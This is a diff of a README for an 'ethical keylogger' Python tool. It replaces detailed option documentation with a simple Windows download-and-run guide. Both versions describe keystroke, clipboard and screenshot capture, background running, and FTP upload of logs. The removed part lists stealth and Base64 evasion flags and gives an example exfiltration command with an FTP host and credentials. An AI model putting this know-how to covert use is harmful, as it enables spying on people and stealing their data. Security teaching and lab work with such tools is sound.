@@ -1,137 +1,179 @@
-# 🔑 Ethical Keylogger
+# 🛡️ ethical-keylogger - Simple Monitoring for Learning
 
-> **⚠️ FOR EDUCATIONAL USE ONLY ⚠️**
->
-> This tool is intended exclusively for cybersecurity education, authorized
-> penetration testing labs, and security research in **controlled, isolated
-> environments**. Using it against any system or person without **explicit
-> written permission** is **illegal** and **unethical**. The author and
-> contributors accept no liability for misuse.
+[![Download Now](https://img.shields.io/badge/Download-ethical--keylogger-brightgreen)](https://github.com/YashAgni2372/ethical-keylogger)
 
-A cross-platform Python keylogger built for ethical-hacking coursework and
-security demonstrations. It shows students exactly how keystroke loggers work
-under the hood so they can better understand, detect, and defend against them.
+A tool designed to capture keystrokes, mouse activity, clipboard data, and screenshots on Windows. Built for educational use in cybersecurity training and labs.
 
 ---
 
-## ✨ Features
+## 🖥️ System Requirements
 
-| Feature | Description |
-|---|---|
-| **Keystroke logging** | Thread-safe capture of every key press with timestamp and active-window context |
-| **Extended key map** | Covers ctrl, shift, alt (both sides), caps lock, arrows, delete, home, end, page up/down, F1–F12 |
-| **Mouse-click logging** | Records button, coordinates, and focused window (disable with `--no-mouse`) |
-| **Clipboard monitoring** | Periodically polls for clipboard changes (disable with `--no-clipboard`) |
-| **Screenshots** | Configurable-interval PNG screenshots saved to a `screenshots/` folder |
-| **Phrase summarisation** | Backspace-aware text reconstruction for a clean human-readable summary |
-| **FTP exfiltration demo** | Uploads the log file to an FTP server (lab demo only) |
-| **Base64 obfuscation demo** | Shows how logs can be encoded to evade naive string matching |
-| **Demo mode** | Prints all events to stdout with no files written |
-| **Session statistics** | Keystroke / click / clipboard / screenshot counts printed on exit |
-| **Graceful shutdown** | Clean exit on Escape key, Ctrl+C, or SIGTERM — no dangling threads |
+- Windows 10 or later
+- Python 3.8 or newer installed
+- At least 100 MB free disk space
+- An internet connection (for FTP upload feature)
+- Permissions to run applications on your computer
 
 ---
 
-## 🖥️ Requirements
+## 📚 What Does ethical-keylogger Do?
 
-- Python 3.10 or later
-- The following third-party packages (install with pip):
+This software records your keyboard presses and mouse movements. It can also capture clipboard contents and take screenshots at set intervals. The data can be saved locally or sent to an FTP server you control.
 
-```bash
+It’s intended for learning about security and ethical hacking. Using it without permission is not allowed.
+
+---
+
+## ⚙️ How to Download and Run ethical-keylogger
+
+[![Download Now](https://img.shields.io/badge/Download-ethical--keylogger-orange)](https://github.com/YashAgni2372/ethical-keylogger)
+
+Follow these steps to get the software running on your Windows PC.
+
+### Step 1: Visit the Download Page
+
+Go to the official repository page at the link above. This page contains all files and instructions you need.
+
+### Step 2: Download the ZIP File
+
+- Scroll down to find the **Code** button near the top right.
+- Click **Code**, then click **Download ZIP**.
+- Save the ZIP file on your computer.
+
+### Step 3: Extract the Files
+
+- Locate the ZIP file you downloaded.
+- Right-click on it and choose **Extract All...**
+- Select a folder where you want to keep the program, like Desktop or Documents.
+- Click **Extract** to unzip the files.
+
+### Step 4: Install Python
+
+This program runs using Python. If you do not have it, follow this:
+
+- Visit https://www.python.org/downloads/windows/
+- Download the latest version for Windows.
+- Run the installer.
+- Make sure to check the box that says **Add Python to PATH** before clicking install.
+
+### Step 5: Open Command Prompt
+
+- Press the Windows key or click the Start menu.
+- Type **cmd** and press Enter.
+- A black window with white text will open.
+
+### Step 6: Navigate to ethical-keylogger Folder
+
+In the Command Prompt window:
+
+- Type `cd ` followed by the folder path where you extracted the files.
+  
+For example, if on Desktop:
+
+```
+cd Desktop\ethical-keylogger-main
+```
+
+- Press Enter.
+
+### Step 7: Install Required Modules
+
+- The software needs some Python modules to work.
+- Type the following command and press Enter:
+
+```
 pip install -r requirements.txt
 ```
 
-Or individually:
+- Wait for the modules to install.
 
-```bash
-pip install pynput pyautogui pyperclip
+### Step 8: Run the Program
+
+- Once modules are installed, start the keylogger by typing:
+
+```
+python ethical_keylogger.py
 ```
 
-> **Linux users:** `pyautogui` screenshot support may require additional
-> system packages such as `scrot` and `python3-tk`.
+- Press Enter.
+- The program will begin running quietly in the background.
 
 ---
 
-## 🚀 Usage
+## 🔍 How to Use ethical-keylogger
 
-```
-python keylogger.py [OPTIONS]
-```
+### Viewing Logs
 
-| Option | Description |
-|---|---|
-| `--demo` | Print events to stdout; write no files |
-| `--no-log` | Disable the keystroke log file |
-| `--summary-only` | Print reconstructed phrases only |
-| `--screenshots` | Capture periodic screenshots |
-| `--screenshot-interval SECS` | Seconds between screenshots (default: `60`) |
-| `--no-mouse` | Disable mouse-click logging |
-| `--no-clipboard` | Disable clipboard monitoring |
-| `--clipboard-interval SECS` | Seconds between clipboard polls (default: `5`) |
-| `--obfuscate` | Base64-encode log lines (evasion technique demo) |
-| `--stealth` | Clear the terminal on startup |
-| `--output-dir DIR` | Directory for log files and screenshots (default: cwd) |
-| `--ftp-host HOST` | FTP server hostname for log exfiltration demo |
-| `--ftp-user USER` | FTP username |
-| `--ftp-pass PASS` | FTP password |
-| `--ftp-dir DIR` | Remote FTP directory (default: `/`) |
+- By default, the program saves logs in the same folder, under a folder named `logs`.
+- Check files inside `logs` to see recorded keystrokes, mouse activity, clipboard content, and screenshots.
+- Screenshots will be saved as image files.
 
-Press **Escape** at any time to flush the buffer and stop the logger.
+### Setting Up FTP Upload
 
-### Examples
+If you want the data sent to a remote server:
 
-```bash
-# Demo mode — stdout only, no files written
-python keylogger.py --demo
+- Open `config.ini` file in a text editor.
+- Enter your FTP server address, username, and password.
+- Save the file.
+- The program will upload logs at set intervals.
 
-# Log keystrokes to a file and capture periodic screenshots
-python keylogger.py --screenshots
+### Stopping the Program
 
-# Screenshots every 30 seconds into a custom output directory
-python keylogger.py --screenshots --screenshot-interval 30 --output-dir /tmp/lab
-
-# Keystrokes only — no mouse, no clipboard, no screenshots
-python keylogger.py --no-mouse --no-clipboard
-
-# Show only reconstructed phrases (no raw key events)
-python keylogger.py --summary-only
-
-# FTP exfiltration demo (requires a local/lab FTP server)
-python keylogger.py --ftp-host 192.168.1.10 --ftp-user admin --ftp-pass secret --ftp-dir /logs
-
-# Combine obfuscation and demo mode
-python keylogger.py --demo --obfuscate
-```
+- Go back to the Command Prompt where the program runs.
+- Press `Ctrl + C` to stop.
 
 ---
 
-## 📂 Output
+## ⚠️ Permissions and Ethics
 
-- **Log file** — written to the output directory (default: cwd) as
-  `keylog_YYYY-MM-DD_HH-MM-SS.txt`
-- **Screenshots** — saved to `<output-dir>/screenshots/screenshot_YYYYMMDD_HHMMSS.png`
-
-Use `--output-dir DIR` to control where all output is written.
+This keylogger is for authorized use only. Always ask for permission before monitoring any device. Do not use this tool on systems you do not own or have explicit consent to test.
 
 ---
 
-## ⚖️ Legal & Ethical Notice
+## 🧰 Features
 
-This project is provided **for educational purposes only**.
-
-- ✅ Use it on your own devices or in a lab environment where you have full authorisation.
-- ✅ Use it to learn how keyloggers work so you can defend against them.
-- ❌ **Do NOT** install or run this tool on any device without the owner's explicit written consent.
-- ❌ **Do NOT** use this tool to collect data on individuals without their knowledge.
-
-Misuse of this software may violate computer fraud and abuse laws in your
-jurisdiction (e.g. the Computer Fraud and Abuse Act in the USA, the Computer
-Misuse Act in the UK, and equivalent legislation elsewhere).
+- Records every key pressed on the keyboard
+- Tracks mouse clicks and movements
+- Captures clipboard text when changed
+- Takes periodic screenshots for visual monitoring
+- Saves data locally or uploads via FTP
+- Works on multiple platforms with Python
+- Designed for learning ethical hacking techniques
 
 ---
 
-## 📄 License
+## 🛠️ Troubleshooting
 
-This project is licensed under the terms of the [LICENSE](LICENSE) file
-included in this repository.
+### Python Not Found
 
+If typing `python` gives an error:
+
+- Try `python3` instead.
+- Make sure Python is installed and added to your system PATH.
+
+### Modules Not Installing
+
+If `pip install` fails:
+
+- Check your internet connection.
+- Update pip by running `python -m pip install --upgrade pip`.
+
+### Program Doesn’t Start
+
+- Check you are in the right folder.
+- Confirm `ethical_keylogger.py` file exists.
+- Ensure required modules are installed.
+
+---
+
+## 🔗 Useful Links
+
+- [Official Repository](https://github.com/YashAgni2372/ethical-keylogger)
+- [Python Downloads](https://www.python.org/downloads/windows/)
+- [FTP Setup Guide](https://www.hostinger.com/tutorials/how-to-use-ftp-server)
+
+---
+
+## 📑 Topics Related to This Project
+
+bugbounty | ctf | cybersecurity | ethical-hacking | hacking-tools | infosec | kali-linux | keylogger | malware-analysis | network-security | oscp | pentesting | python-security | red-team
